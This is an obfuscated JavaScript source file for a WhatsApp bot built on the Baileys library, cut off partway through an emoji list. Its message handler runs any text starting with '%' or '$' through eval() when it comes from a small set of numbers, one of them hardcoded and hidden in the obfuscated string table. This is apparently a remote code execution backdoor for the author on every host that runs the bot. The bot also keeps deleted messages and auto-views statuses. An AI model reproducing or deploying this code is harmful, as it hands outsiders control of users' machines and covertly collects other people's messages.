const _0x32c960 = _0x28ab;
(function(_0x100d62, _0x11636a) {
    const _0x4002e6 = _0x28ab,
        _0x34de63 = _0x100d62();
    while (!![]) {
        try {
            const _0x37ebdd = -parseInt(_0x4002e6(0x20a)) / 0x1 * (parseInt(_0x4002e6(0x15a)) / 0x2) + -parseInt(_0x4002e6(0x1ef)) / 0x3 * (parseInt(_0x4002e6(0x1f3)) / 0x4) + -parseInt(_0x4002e6(0x266)) / 0x5 + -parseInt(_0x4002e6(0x282)) / 0x6 + parseInt(_0x4002e6('\x30\x78\x31\x65\x64')) / 0x7 * (parseInt(_0x4002e6(0x118)) / 0x8) + parseInt(_0x4002e6('\x30\x78\x31\x63\x66')) / 0x9 + parseInt(_0x4002e6(0x20e)) / 0xa * (parseInt(_0x4002e6(0x28a)) / 0xb);
            if (_0x37ebdd === _0x11636a) break;
            else _0x34de63['push'](_0x34de63['shift']());
        } catch (_0x5deef9) {
            _0x34de63['push'](_0x34de63['shift']());
        }
    }
}(_0x8d4a, 0xdc49c));
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require(_0x32c960('\x30\x78\x66\x31')), l = console[_0x32c960('\x30\x78\x31\x39\x66')], {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson
} = require(_0x32c960(0x143)), {
    AntiDelDB,
    initializeAntiDeleteSettings,
    setAnti,
    getAnti,
    getAllAntiDeleteSettings,
    saveContact,
    loadMessage,
    getName,
    getChatSummary,
    saveGroupMetadata,
    getGroupMetadata,
    saveMessageCount,
    getInactiveGroupMembers,
    getGroupMembersMessageCount,
    saveMessage
} = require(_0x32c960('\x30\x78\x31\x62\x66')), fs = require('\x66\x73'), ff = require('\x66\x6c\x75\x65\x6e\x74\x2d\x66\x66\x6d\x70\x65\x67'), P = require('\x70\x69\x6e\x6f'), config = require('\x2e\x2f\x63\x6f\x6e\x66\x69\x67'), qrcode = require(_0x32c960(0x272)), StickersTypes = require(_0x32c960('\x30\x78\x31\x37\x35')), util = require('\x75\x74\x69\x6c'), {
    sms,
    downloadMediaMessage,
    AntiDelete
} = require(_0x32c960(0x181)), FileType = require(_0x32c960(0xdd)), axios = require(_0x32c960(0x228)), {
    File
} = require('\x6d\x65\x67\x61\x6a\x73'), {
    fromBuffer
} = require(_0x32c960('\x30\x78\x64\x64')), bodyparser = require(_0x32c960(0x134)), os = require('\x6f\x73'), Crypto = require(_0x32c960(0x182)), path = require('\x70\x61\x74\x68'), prefix = config[_0x32c960('\x30\x78\x32\x30\x35')], ownerNumber = ['\x39\x32\x33\x31\x34\x33\x37\x30\x32\x32\x37\x30'], tempDir = path[_0x32c960('\x30\x78\x32\x38\x31')](os[_0x32c960('\x30\x78\x31\x35\x63')](), '\x63\x61\x63\x68\x65\x2d\x74\x65\x6d\x70');
!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](tempDir) && fs['\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63'](tempDir);
const clearTempDir = () => {
    const _0x38c5e4 = _0x32c960;
    fs[_0x38c5e4(0x171)](tempDir, (_0x4839ae, _0x776308) => {
        const _0x16d382 = _0x38c5e4;
        if (_0x4839ae) throw _0x4839ae;
        for (const _0x507d78 of _0x776308) {
            fs[_0x16d382('\x30\x78\x32\x30\x63')](path[_0x16d382(0x281)](tempDir, _0x507d78), _0x61484e => {
                if (_0x61484e) throw _0x61484e;
            });
        }
    });
};
setInterval(clearTempDir, 0x5 * 0x3c * 0x3e8);

function _0x28ab(_0x1b4920, _0x38fcb1) {
    const _0x8d4adc = _0x8d4a();
    return _0x28ab = function(_0x28abe0, _0x5b2b3a) {
        _0x28abe0 = _0x28abe0 - 0xdd;
        let _0x197162 = _0x8d4adc[_0x28abe0];
        return _0x197162;
    }, _0x28ab(_0x1b4920, _0x38fcb1);
}
if (!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](__dirname + _0x32c960('\x30\x78\x32\x36\x39'))) {
    if (!config[_0x32c960(0x105)]) return console[_0x32c960(0x19f)](_0x32c960('\x30\x78\x32\x32\x64'));
    const sessdata = config[_0x32c960(0x105)][_0x32c960('\x30\x78\x31\x38\x39')](_0x32c960('\x30\x78\x32\x31\x35'), ''),
        filer = File['\x66\x72\x6f\x6d\x55\x52\x4c'](_0x32c960(0x11c) + sessdata);
    filer[_0x32c960(0x23d)]((_0xb6351b, _0x1f8b31) => {
        const _0x2e3e89 = _0x32c960;
        if (_0xb6351b) throw _0xb6351b;
        fs[_0x2e3e89(0x165)](__dirname + _0x2e3e89(0x269), _0x1f8b31, () => {
            const _0x5ee28c = _0x2e3e89;
            console[_0x5ee28c('\x30\x78\x31\x39\x66')](_0x5ee28c('\x30\x78\x31\x38\x62'));
        });
    });
}
const express = require('\x65\x78\x70\x72\x65\x73\x73'),
    app = express(),
    port = process[_0x32c960(0x251)][_0x32c960('\x30\x78\x31\x33\x33')] || 0x2382;
async function connectToWA() {
    const _0x53f6bb = _0x32c960;
    console['\x6c\x6f\x67']('\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6e\x67\x20\x74\x6f\x20\x57\x68\x61\x74\x73\x41\x70\x70\x20\u23f3\ufe0f\x2e\x2e\x2e');
    const {
        state: _0x37e242,
        saveCreds: _0x186f9d
    } = await useMultiFileAuthState(__dirname + _0x53f6bb('\x30\x78\x32\x39\x61'));
    var {
        version: _0x5b8d4c
    } = await fetchLatestBaileysVersion();
    const _0x25f52f = makeWASocket({
        '\x6c\x6f\x67\x67\x65\x72': P({
            '\x6c\x65\x76\x65\x6c': _0x53f6bb('\x30\x78\x31\x62\x33')
        }),
        '\x70\x72\x69\x6e\x74\x51\x52\x49\x6e\x54\x65\x72\x6d\x69\x6e\x61\x6c': ![],
        '\x62\x72\x6f\x77\x73\x65\x72': Browsers[_0x53f6bb('\x30\x78\x31\x61\x30')](_0x53f6bb(0x16f)),
        '\x73\x79\x6e\x63\x46\x75\x6c\x6c\x48\x69\x73\x74\x6f\x72\x79': !![],
        '\x61\x75\x74\x68': _0x37e242,
        '\x76\x65\x72\x73\x69\x6f\x6e': _0x5b8d4c
    });
    _0x25f52f['\x65\x76']['\x6f\x6e']('\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x2e\x75\x70\x64\x61\x74\x65', _0x28a7fe => {
        const _0x342cba = _0x53f6bb,
            {
                connection: _0xf7bcb1,
                lastDisconnect: _0x4d1abf
            } = _0x28a7fe;
        if (_0xf7bcb1 === _0x342cba(0x140)) _0x4d1abf[_0x342cba(0x26d)][_0x342cba(0x26b)][_0x342cba(0xde)] !== DisconnectReason[_0x342cba('\x30\x78\x65\x39')] && connectToWA();
        else {
            if (_0xf7bcb1 === _0x342cba(0x1a6)) {
                console[_0x342cba('\x30\x78\x31\x39\x66')](_0x342cba(0x293));
                const _0x8630d3 = require(_0x342cba('\x30\x78\x31\x36\x38'));
                fs[_0x342cba('\x30\x78\x32\x33\x65')](_0x342cba('\x30\x78\x31\x38\x33'))[_0x342cba(0x267)](_0x17d576 => {
                    const _0x544e52 = _0x342cba;
                    _0x8630d3[_0x544e52('\x30\x78\x32\x32\x30')](_0x17d576)['\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65']() == '\x2e\x6a\x73' && require(_0x544e52(0x183) + _0x17d576);
                }), console['\x6c\x6f\x67'](_0x342cba(0x10a)), console['\x6c\x6f\x67'](_0x342cba(0x245));
                let _0x523c8e = _0x342cba(0x283);
                _0x25f52f[_0x342cba('\x30\x78\x31\x33\x39')](_0x25f52f[_0x342cba(0x29b)]['\x69\x64'], {
                    '\x69\x6d\x61\x67\x65': {
                        '\x75\x72\x6c': _0x342cba(0x1ea)
                    },
                    '\x63\x61\x70\x74\x69\x6f\x6e': _0x523c8e
                });
            }
        }
    }), _0x25f52f['\x65\x76']['\x6f\x6e'](_0x53f6bb('\x30\x78\x31\x32\x31'), _0x186f9d), _0x25f52f['\x65\x76']['\x6f\x6e'](_0x53f6bb('\x30\x78\x31\x66\x39'), async _0x5d48ee => {
        const _0x21c8cb = _0x53f6bb;
        for (const _0x5ca218 of _0x5d48ee) {
            _0x5ca218[_0x21c8cb('\x30\x78\x32\x37\x30')]['\x6d\x65\x73\x73\x61\x67\x65'] === null && (console[_0x21c8cb(0x19f)](_0x21c8cb(0x185), JSON[_0x21c8cb(0x26c)](_0x5ca218, null, 0x2)), await AntiDelete(_0x25f52f, _0x5d48ee));
        }
    }), _0x25f52f['\x65\x76']['\x6f\x6e']('\x6d\x65\x73\x73\x61\x67\x65\x73\x2e\x75\x70\x73\x65\x72\x74', async _0x585fe8 => {
        const _0x1ed978 = _0x53f6bb;
        _0x585fe8 = _0x585fe8[_0x1ed978(0x1a4)][0x0];
        if (!_0x585fe8[_0x1ed978(0x174)]) return;
        _0x585fe8[_0x1ed978(0x174)] = getContentType(_0x585fe8[_0x1ed978(0x174)]) === _0x1ed978('\x30\x78\x31\x31\x35') ? _0x585fe8[_0x1ed978(0x174)][_0x1ed978(0x115)][_0x1ed978(0x174)] : _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')];
        config[_0x1ed978(0x16c)] === '\x74\x72\x75\x65' && (await _0x25f52f[_0x1ed978(0x17c)]([_0x585fe8[_0x1ed978(0xec)]]), console[_0x1ed978(0x19f)](_0x1ed978('\x30\x78\x32\x31\x63') + _0x585fe8['\x6b\x65\x79'][_0x1ed978('\x30\x78\x32\x30\x31')] + '\x20\x61\x73\x20\x72\x65\x61\x64\x2e'));
        if (_0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')]['\x76\x69\x65\x77\x4f\x6e\x63\x65\x4d\x65\x73\x73\x61\x67\x65\x56\x32']) _0x585fe8[_0x1ed978(0x174)] = getContentType(_0x585fe8['\x6d\x65\x73\x73\x61\x67\x65']) === _0x1ed978('\x30\x78\x31\x31\x35') ? _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')][_0x1ed978(0x115)]['\x6d\x65\x73\x73\x61\x67\x65'] : _0x585fe8[_0x1ed978(0x174)];
        _0x585fe8['\x6b\x65\x79'] && _0x585fe8[_0x1ed978(0xec)][_0x1ed978('\x30\x78\x32\x30\x31')] === _0x1ed978(0x246) && config[_0x1ed978(0x20f)] === '\x74\x72\x75\x65' && await _0x25f52f[_0x1ed978(0x17c)]([_0x585fe8['\x6b\x65\x79']]);
        if (_0x585fe8[_0x1ed978(0xec)] && _0x585fe8[_0x1ed978('\x30\x78\x65\x63')]['\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64'] === _0x1ed978(0x246) && config[_0x1ed978('\x30\x78\x31\x61\x63')] === _0x1ed978(0x23c)) {
            const _0x308523 = await _0x25f52f[_0x1ed978(0x1b5)](_0x25f52f['\x75\x73\x65\x72']['\x69\x64']),
                _0x2643e6 = ['\u2764\ufe0f', '\ud83d\udcb8', '\ud83d\ude07', '\ud83c\udf42', '\ud83d\udca5', '\ud83d\udcaf', '\ud83d\udd25', '\ud83d\udcab', '\ud83d\udc8e', '\ud83d\udc97', '\ud83e\udd0d', '\ud83d\udda4', '\ud83d\udc40', '\ud83d\ude4c', '\ud83d\ude46', '\ud83d\udea9', '\ud83e\udd70', '\ud83d\udc90', '\ud83d\ude0e', '\ud83e\udd0e', '\u2705', '\ud83e\udec0', '\ud83e\udde1', '\ud83d\ude01', '\ud83d\ude04', '\ud83c\udf38', _0x1ed978(0x1ad), '\ud83c\udf37', '\u26c5', '\ud83c\udf1f', '\ud83d\uddff', _0x1ed978(0x162), '\ud83d\udc9c', '\ud83d\udc99', '\ud83c\udf1d', '\ud83d\udda4', '\ud83d\udc9a'],
                _0x492a14 = _0x2643e6[Math[_0x1ed978(0x1cb)](Math[_0x1ed978(0x208)]() * _0x2643e6['\x6c\x65\x6e\x67\x74\x68'])];
            await _0x25f52f[_0x1ed978('\x30\x78\x31\x33\x39')](_0x585fe8[_0x1ed978('\x30\x78\x65\x63')]['\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64'], {
                '\x72\x65\x61\x63\x74': {
                    '\x74\x65\x78\x74': _0x492a14,
                    '\x6b\x65\x79': _0x585fe8['\x6b\x65\x79']
                }
            }, {
                '\x73\x74\x61\x74\x75\x73\x4a\x69\x64\x4c\x69\x73\x74': [_0x585fe8[_0x1ed978('\x30\x78\x65\x63')]['\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74'], _0x308523]
            });
        }
        if (_0x585fe8[_0x1ed978(0xec)] && _0x585fe8[_0x1ed978('\x30\x78\x65\x63')][_0x1ed978(0x201)] === _0x1ed978('\x30\x78\x32\x34\x36') && config['\x41\x55\x54\x4f\x5f\x53\x54\x41\x54\x55\x53\x5f\x52\x45\x50\x4c\x59'] === '\x74\x72\x75\x65') {
            const _0x39b469 = _0x585fe8['\x6b\x65\x79'][_0x1ed978('\x30\x78\x32\x34\x64')],
                _0x161284 = '' + config[_0x1ed978(0x184)];
            await _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x39b469, {
                '\x74\x65\x78\x74': _0x161284,
                '\x72\x65\x61\x63\x74': {
                    '\x74\x65\x78\x74': '\ud83d\udc9c',
                    '\x6b\x65\x79': _0x585fe8[_0x1ed978(0xec)]
                }
            }, {
                '\x71\x75\x6f\x74\x65\x64': _0x585fe8
            });
        }
        await Promise['\x61\x6c\x6c']([saveMessage(_0x585fe8)]);
        const _0xa7df8d = sms(_0x25f52f, _0x585fe8),
            _0xab91c = getContentType(_0x585fe8[_0x1ed978(0x174)]),
            _0x32c651 = JSON[_0x1ed978('\x30\x78\x32\x36\x63')](_0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')]),
            _0x3f69a2 = _0x585fe8[_0x1ed978(0xec)][_0x1ed978('\x30\x78\x32\x30\x31')],
            _0x5dc601 = _0xab91c == _0x1ed978(0x188) && _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')]['\x65\x78\x74\x65\x6e\x64\x65\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65'][_0x1ed978(0x124)] != null ? _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')]['\x65\x78\x74\x65\x6e\x64\x65\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65']['\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f'][_0x1ed978(0x179)] || [] : [],
            _0x14f3e6 = _0xab91c === _0x1ed978(0xea) ? _0x585fe8[_0x1ed978(0x174)][_0x1ed978('\x30\x78\x65\x61')] : _0xab91c === '\x65\x78\x74\x65\x6e\x64\x65\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65' ? _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')]['\x65\x78\x74\x65\x6e\x64\x65\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65']['\x74\x65\x78\x74'] : _0xab91c == '\x69\x6d\x61\x67\x65\x4d\x65\x73\x73\x61\x67\x65' && _0x585fe8[_0x1ed978(0x174)][_0x1ed978(0x1b8)]['\x63\x61\x70\x74\x69\x6f\x6e'] ? _0x585fe8[_0x1ed978('\x30\x78\x31\x37\x34')][_0x1ed978('\x30\x78\x31\x62\x38')][_0x1ed978('\x30\x78\x31\x63\x34')] : _0xab91c == _0x1ed978(0x155) && _0x585fe8[_0x1ed978(0x174)][_0x1ed978(0x155)][_0x1ed978(0x1c4)] ? _0x585fe8['\x6d\x65\x73\x73\x61\x67\x65']['\x76\x69\x64\x65\x6f\x4d\x65\x73\x73\x61\x67\x65'][_0x1ed978('\x30\x78\x31\x63\x34')] : '',
            _0x494d2f = _0x14f3e6['\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68'](prefix);
        var _0xc2160c = typeof _0x585fe8['\x74\x65\x78\x74'] == _0x1ed978('\x30\x78\x65\x36') ? _0x585fe8[_0x1ed978('\x30\x78\x32\x39\x30')] : ![];
        const _0x2db2b2 = _0x494d2f ? _0x14f3e6[_0x1ed978(0x1d5)](prefix[_0x1ed978(0x1c5)])[_0x1ed978(0x207)]()[_0x1ed978('\x30\x78\x31\x62\x64')]('\x20')['\x73\x68\x69\x66\x74']()['\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65']() : '',
            _0x2b2f90 = _0x14f3e6[_0x1ed978('\x30\x78\x32\x30\x37')]()['\x73\x70\x6c\x69\x74'](/ +/)['\x73\x6c\x69\x63\x65'](0x1),
            _0x1398f4 = _0x2b2f90[_0x1ed978('\x30\x78\x32\x38\x31')]('\x20'),
            _0x37860e = _0x2b2f90[_0x1ed978('\x30\x78\x32\x38\x31')]('\x20'),
            _0x5b6d29 = _0x3f69a2[_0x1ed978(0x288)](_0x1ed978(0xfc)),
            _0x473af2 = _0x585fe8['\x6b\x65\x79'][_0x1ed978(0x27a)] ? _0x25f52f[_0x1ed978('\x30\x78\x32\x39\x62')]['\x69\x64']['\x73\x70\x6c\x69\x74']('\x3a')[0x0] + _0x1ed978(0x259) || _0x25f52f[_0x1ed978('\x30\x78\x32\x39\x62')]['\x69\x64'] : _0x585fe8[_0x1ed978('\x30\x78\x65\x63')][_0x1ed978('\x30\x78\x32\x34\x64')] || _0x585fe8[_0x1ed978('\x30\x78\x65\x63')]['\x72\x65\x6d\x6f\x74\x65\x4a\x69\x64'],
            _0x4a39ba = _0x473af2['\x73\x70\x6c\x69\x74']('\x40')[0x0],
            _0xb16346 = _0x25f52f[_0x1ed978(0x29b)]['\x69\x64'][_0x1ed978('\x30\x78\x31\x62\x64')]('\x3a')[0x0],
            _0x157dbf = _0x585fe8[_0x1ed978(0x18c)] || '\x53\x69\x6e\x20\x4e\x6f\x6d\x62\x72\x65',
            _0x2d722c = _0xb16346[_0x1ed978('\x30\x78\x31\x39\x36')](_0x4a39ba),
            _0x5bcc99 = ownerNumber[_0x1ed978('\x30\x78\x31\x39\x36')](_0x4a39ba) || _0x2d722c,
            _0x49f3aa = await jidNormalizedUser(_0x25f52f[_0x1ed978(0x29b)]['\x69\x64']),
            _0x2940c7 = _0x5b6d29 ? await _0x25f52f[_0x1ed978(0x1fd)](_0x3f69a2)[_0x1ed978('\x30\x78\x31\x35\x62')](_0x1b6b3e => {}) : '',
            _0x3a1a21 = _0x5b6d29 ? _0x2940c7[_0x1ed978('\x30\x78\x32\x32\x65')] : '',
            _0x471a70 = _0x5b6d29 ? await _0x2940c7['\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73'] : '',
            _0x2817a6 = _0x5b6d29 ? await getGroupAdmins(_0x471a70) : '',
            _0x524b64 = _0x5b6d29 ? _0x2817a6[_0x1ed978(0x196)](_0x49f3aa) : ![],
            _0x554cc9 = _0x5b6d29 ? _0x2817a6[_0x1ed978('\x30\x78\x31\x39\x36')](_0x473af2) : ![],
            _0x457ee3 = _0xa7df8d[_0x1ed978(0x174)]['\x72\x65\x61\x63\x74\x69\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65'] ? !![] : ![],
            _0x21c5e4 = _0x51f5b8 => {
                _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x3f69a2, {
                    '\x74\x65\x78\x74': _0x51f5b8
                }, {
                    '\x71\x75\x6f\x74\x65\x64': _0x585fe8
                });
            },
            _0x1b1602 = _0xb16346[_0x1ed978('\x30\x78\x31\x62\x64')]('\x40')[0x0],
            _0x5a2e45 = (_0x1ed978(0x16b), _0x1ed978('\x30\x78\x31\x63\x64'), _0x1ed978('\x30\x78\x32\x36\x30'));
        let _0x162b89 = [_0x1b1602, _0x5a2e45, config[_0x1ed978('\x30\x78\x31\x32\x35')]][_0x1ed978('\x30\x78\x31\x33\x38')](_0x4fc039 => _0x4fc039[_0x1ed978('\x30\x78\x31\x38\x39')](/[^0-9]/g) + _0x1ed978(0x259))[_0x1ed978('\x30\x78\x31\x39\x36')](_0x585fe8['\x73\x65\x6e\x64\x65\x72']);
        if (_0x162b89 && _0x585fe8[_0x1ed978('\x30\x78\x32\x39\x30')][_0x1ed978(0x1da)]('\x25')) {
            let _0x386551 = _0xc2160c['\x73\x6c\x69\x63\x65'](0x2);
            if (!_0x386551) {
                _0x21c5e4(_0x1ed978('\x30\x78\x32\x35\x32'));
                return;
            }
            try {
                let _0xfe7ab9 = eval(_0x386551);
                if (typeof _0xfe7ab9 === _0x1ed978(0x193)) _0x21c5e4(util[_0x1ed978('\x30\x78\x31\x38\x66')](_0xfe7ab9));
                else _0x21c5e4(util[_0x1ed978(0x18f)](_0xfe7ab9));
            } catch (_0x5b0e97) {
                _0x21c5e4(util['\x66\x6f\x72\x6d\x61\x74'](_0x5b0e97));
            }
            return;
        }
        if (_0x162b89 && _0x585fe8[_0x1ed978('\x30\x78\x32\x39\x30')][_0x1ed978(0x1da)]('\x24')) {
            let _0x411bdc = _0xc2160c[_0x1ed978(0x1d5)](0x2);
            if (!_0x411bdc) {
                _0x21c5e4('\x50\x72\x6f\x76\x69\x64\x65\x20\x6d\x65\x20\x77\x69\x74\x68\x20\x61\x20\x71\x75\x65\x72\x79\x20\x74\x6f\x20\x72\x75\x6e\x20\x4d\x61\x73\x74\x65\x72\x21');
                return;
            }
            try {
                let _0x3ff5c0 = await eval('\x63\x6f\x6e\x73\x74\x20\x61\x20\x3d\x20\x61\x73\x79\x6e\x63\x28\x29\x3d\x3e\x7b\x0a' + _0x411bdc + '\x0a\x7d\x0a\x61\x28\x29'),
                    _0x3967b2 = util[_0x1ed978(0x18f)](_0x3ff5c0);
                if (_0x3967b2 === undefined) return console[_0x1ed978(0x19f)](_0x3967b2);
                else _0x21c5e4(_0x3967b2);
            } catch (_0x39323f) {
                if (_0x39323f === undefined) return console['\x6c\x6f\x67'](_0x1ed978(0x26d));
                else _0x21c5e4(util['\x66\x6f\x72\x6d\x61\x74'](_0x39323f));
            }
            return;
        }
        if (_0x4a39ba['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x1ed978('\x30\x78\x31\x36\x62'))) {
            if (_0x457ee3) return;
            _0xa7df8d[_0x1ed978('\x30\x78\x31\x39\x32')]('\ud83e\udd8b');
        }
        if (!_0x457ee3 && _0x4a39ba !== _0xb16346) {
            if (config['\x41\x55\x54\x4f\x5f\x52\x45\x41\x43\x54'] === '\x74\x72\x75\x65') {
                const _0x551370 = ['\ud83d\ude0a', '\ud83d\udc4d', '\ud83d\ude02', '\ud83d\udcaf', '\ud83d\udd25', '\ud83d\ude4f', '\ud83c\udf89', '\ud83d\udc4f', '\ud83d\ude0e', '\ud83e\udd16', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', '\ud83d\udd77\ufe0f', '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), _0x1ed978(0x286), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', '\ud83d\udd74\ufe0f', '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', '\ud83d\udd74\ufe0f', '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978('\x30\x78\x31\x32\x37'), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978(0xee), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), '\ud83d\udd78\ufe0f', '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', '\ud83d\udd74\ufe0f', '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978(0x239), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978('\x30\x78\x31\x32\x37'), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', 